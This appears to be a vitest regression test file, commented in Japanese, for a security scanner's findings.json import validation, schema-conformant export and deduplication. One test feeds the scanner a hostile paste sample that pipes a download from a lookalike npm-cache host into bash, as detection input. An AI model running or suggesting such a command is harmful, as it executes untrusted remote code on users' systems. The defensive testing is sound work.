// findings.json の取り込み（敵対的な入力）と書き出し（常にスキーマ適合）の回帰テスト。
import { describe, expect, it } from 'vitest';
import { analyzeFiles, analyzePaste, IOC } from '../../src/engine';
import { ImportError, parseFindingsDoc, toFindingsDoc } from '../../src/engine/export';
import { loadFixture } from './fixtures';
import { validate } from './schema';
import { allFindings, initialState } from '../../src/state/reducer';

const H = (c: string) => 'sha256:' + c.repeat(64);
const good = { id: H('a'), level: 'HIGH', module: '§17', campaign: 'mcp-poisoning', path: '/home/u/.mcp.json', detail: 'x', evidence_hash: H('b') };
const sp = { contract_path: '/s/skill.contract.json', contract_version: '0.8', level: 'L1', signed: true, author: null, declared_effects: ['read'], observed_effects: ['exec', 'send'], policy_decision: null, l2_tested: false, divergence: ['exec'], diff_anomaly: false };
const doc = (findings: unknown[], errors: unknown[] = [], extra: Record<string, unknown> = {}) => JSON.stringify({
  schema_version: '1.0', incident_bundle: 'ZES-2026-SEP-EMERGENCY-V5.1', scan_started_at: '2026-10-01T00:00:00Z', scan_finished_at: '2026-10-01T00:00:05Z',
  scan_mode: 'full', status: 'ok', findings, errors, ...extra,
});

describe('findings.json の取り込み（スキーマ検査）', () => {
  it('スキーマに合わない finding / error は除外して件数を返す', () => {
    const hostile = [
      good,
      { ...good, id: H('c'), campaign: { $$typeof: 'x', props: {} } }, // React 子要素として描画すると #31
      { ...good, id: H('d'), path: 42 }, // 検索の toLowerCase で落ちる
      { ...good, id: 'abc' },
      { ...good, id: H('e'), module: '17' },
      { ...good, id: H('f'), module: '§50' },
      { ...good, id: H('1'), evidence_hash: '' },
      { ...good, id: H('2'), level: 'SEVERE' },
      { ...good, id: H('3'), path: 'relative/path' },
      { ...good, id: H('4'), extra: 1 },
      { ...good, id: H('5'), module: '§49' }, // §49 は skillpact 必須
      { ...good, id: H('6'), skillpact: sp }, // §49 以外は skillpact 禁止
      { ...good, id: H('7'), module: '§49', skillpact: { ...sp, observed_effects: ['exec', 'exec'] } },
      { ...good, id: H('9'), module: '§49', skillpact: { ...sp, divergence: ['secrets'] } }, // SkillPact 0.8 にない効果名
      { ...good, id: H('8'), module: '§49', skillpact: sp },
      null, 'str', [good],
    ];
    const r = parseFindingsDoc(doc(hostile, [{ module: 'core', reason: 'ok' }, { module: '§99', reason: 'x' }, { module: 'core', reason: 3 }, { module: '§6', reason: 'network_timeout', x: 1 }]));
    expect(r.findings.map((f) => f.id)).toEqual([H('a'), H('8')]);
    expect(r.errors).toEqual([{ module: 'core', reason: 'ok' }]);
    expect(r.dropped).toBe(hostile.length - 2 + 3);
    expect(r.findings.every((f) => (f.campaign === null || typeof f.campaign === 'string') && (f.path === null || typeof f.path === 'string'))).toBe(true);
  });
  it('文書として不正なら ImportError', () => {
    expect(() => parseFindingsDoc('{')).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { status: 'weird' }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { incident_bundle: 'nope' }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { scan_started_at: 1 }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { unknown_top: 1 }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(JSON.stringify({ schema_version: '1.0', findings: [], errors: [] }))).toThrow(ImportError);
  });
});

describe('findings.json の書き出しは常にスキーマに適合', () => {
  it('UI のスキャン + 貼り付け + CLI 取り込みを合わせた書き出し', async () => {
    const r = await analyzeFiles(['chaindrop', 'mcp', 'github-actions', 'skillpact-divergence', 'skillpact-policy', 'skillpact-signed-divergence', 'skillpact-malformed', 'skillpact-undeclared', 'skillpact-diff-anomaly', 'litellm', 'intel-2026q3'].flatMap((n) => loadFixture(n)));
    const paste = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash');
    const imported = parseFindingsDoc(doc([good, { ...good, id: 'bad' }, { ...good, id: H('8'), module: '§49', skillpact: sp }], [{ module: '§6', reason: 'network_timeout' }], { status: 'error' }));
    const all = [...r.findings, ...paste, ...imported.findings];
    const out = toFindingsDoc(all, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z', imported);
    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
    // 取り込んだ errors[] と取り込み元の incident_bundle・status を引き継ぐ
    expect(out.errors).toContainEqual({ module: '§6', reason: 'network_timeout' });
    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:imported_incident_bundle:ZES-2026-SEP-EMERGENCY-V5.1' });
    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:import_dropped_invalid_entries:1' });
    expect(out.status).toBe('error');
    expect(out.findings.length).toBe(all.length);
  });
  it('検証器自体が違反を検出する', () => {
    expect(validate(JSON.parse(doc([{ ...good, id: 'x' }])))).not.toEqual([]);
    expect(validate(JSON.parse(doc([good])))).toEqual([]);
  });
});

describe('書き出し → 取り込み → 書き出しで finding が重複しない', () => {
  it('自分の書き出しを取り込んでも id は一意で、件数は変わらない', async () => {
    const r = await analyzeFiles(loadFixture('chaindrop'));
    expect(r.findings.length).toBeGreaterThan(0);
    const t0 = '2026-10-22T00:00:00Z', t1 = '2026-10-22T00:00:01Z';
    const first = toFindingsDoc(r.findings, r.errors, IOC.incident_bundle, t0, t1);
    const imported = parseFindingsDoc(JSON.stringify(first));
    const s = { ...initialState, phase: 'done' as const, result: r, imported };
    const shown = allFindings(s);
    expect(shown.length).toBe(r.findings.length);
    // スキャン結果を優先（取り込み側の cli-import で上書きしない）
    expect(shown.every((f) => f.source !== 'cli-import')).toBe(true);
    const second = toFindingsDoc(shown, r.errors, IOC.incident_bundle, t0, t1, imported);
    const ids = second.findings.map((f) => f.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids.sort()).toEqual(first.findings.map((f) => f.id).sort());
    expect(validate(JSON.parse(JSON.stringify(second)))).toEqual([]);
  });
  it('取り込みにだけある finding は残す', async () => {
    const r = await analyzeFiles(loadFixture('chaindrop'));
    const imported = parseFindingsDoc(doc([good]));
    const shown = allFindings({ ...initialState, result: r, imported });
    expect(shown.length).toBe(r.findings.length + 1);
    expect(shown.filter((f) => f.id === good.id)).toHaveLength(1);
  });
  it('toFindingsDoc は同じ id を 2 回出さない（先勝ち）', () => {
    const f = parseFindingsDoc(doc([good])).findings[0]!;
    const out = toFindingsDoc([f, { ...f, detail: 'dup' }], [], IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z');
    expect(out.findings).toHaveLength(1);
    expect(out.findings[0]!.detail).toBe('x');
  });
});
